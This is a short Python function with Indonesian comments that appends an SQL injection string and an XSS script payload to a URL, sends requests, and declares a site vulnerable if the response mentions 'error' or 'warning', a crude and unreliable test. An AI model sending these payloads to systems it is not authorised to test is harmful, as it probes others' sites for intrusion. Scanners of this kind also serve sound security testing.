import requests

def scan_exploit(url):
    # Contoh payload eksploitasi, misalnya SQLi atau lainnya
    payloads = [
        "' OR 1=1 --",  # SQL Injection payload
        "<script>alert('XSS')</script>"  # XSS payload
    ]
    
    exploit_found = False
    for payload in payloads:
        test_url = url + payload
        try:
            r = requests.get(test_url, timeout=5)
            # Menandakan apakah eksploitasi berhasil
            if "error" in r.text.lower() or "warning" in r.text.lower():
                print(f"Eksploitasi berhasil dengan payload: {payload}")
                exploit_found = True
        except requests.exceptions.RequestException as e:
            print(f"Error saat mengakses URL: {e}")
            continue

    if not exploit_found:
        print("âœ…Tidak ditemukan indikasi eksploitasi pada URL.")
    return {"url": url, "vulnerable": exploit_found}
